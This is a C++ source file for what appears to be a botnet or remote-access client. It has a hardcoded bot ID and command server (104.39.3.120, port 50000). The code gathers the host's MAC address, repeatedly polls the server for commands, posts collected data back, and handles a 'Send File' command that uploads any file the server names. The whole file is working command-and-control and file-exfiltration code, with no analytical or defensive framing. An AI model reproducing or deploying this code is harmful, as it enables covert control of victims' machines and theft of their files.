#include "lib\DataCollector.h"
#include "lib\UtilLib.h"
#include <iostream>
#include "lib\ActionController.h"
#include "lib\HttpLib.h"
#include "lib\ThreadController.h"

void handleAction();


#if defined(THREADING)
ThreadController tc;
#endif
int COUNT = 3;
DataCollector dc;
char *BOT_ID = "qzSz5Ym9dhFNg1iqE96aredXDDrIDWCg";
ActionController ac;
#define BOTLOOP
int port = 50000;
#ifdef ENCODE_HTTP
bool encode = true;
#else
bool encode = false;
#endif
#define REQ_COUNT
vector<vector<string>> requestQueue;
string url = "104.39.3.120";

using namespace std;

int main(){
#if defined(BOTLOOP) || defined(EXECUTE)
char* MAC_ADDR = getMAC();
dc.addDataPair("bot_id", BOT_ID);
dc.addDataPair("mac_address", MAC_ADDR);
#endif

#ifdef EXECUTE
sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData());
dc.dumpCollectedData();
#endif
#ifdef BOTLOOP
string response = "";
struct Action action;
ac.addAction(action);
int reqCounter = 0;
while(1){
#if defined(TIME_CHECK) && defined(REQ_COUNT)
	if (waitForTime(TIMEARRAY, sizeof(TIMEARRAY), COUNT)){
#endif
		response = sendG_Request(url, port, "/database/api/connect_in/", requestQueue, dc.getGetData());
		action = ac.parseAction(response);
		ac.addAction(action);
		handleAction();
		reqCounter++;
		Sleep(3000);
		if(reqCounter % 1 == 0){
			sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData());
			dc.dumpCollectedData();
		}
#ifdef FREQUENCY
waitForPeriod(WAIT);
#endif
#if defined(TIME_CHECK) && defined(REQ_COUNT)
	}
#endif
}
#endif
#if defined THREADING
tc.closeAllThreads();
#endif
}

void handleAction(){
struct Action action;
while(ac.hasAction()){
action = ac.getNextAction();
printf("action %s\n", action.action.c_str());
if(action.action == "Send File"){
printf("doing action %s\n", action.action.c_str());
string filePath = action.arguments.back();
	if(filePath.size() > 0){
		sendFile(url, port, "/database/api/handler/", &dc, filePath);
	}
}
action = ac.getNextAction();
}
}
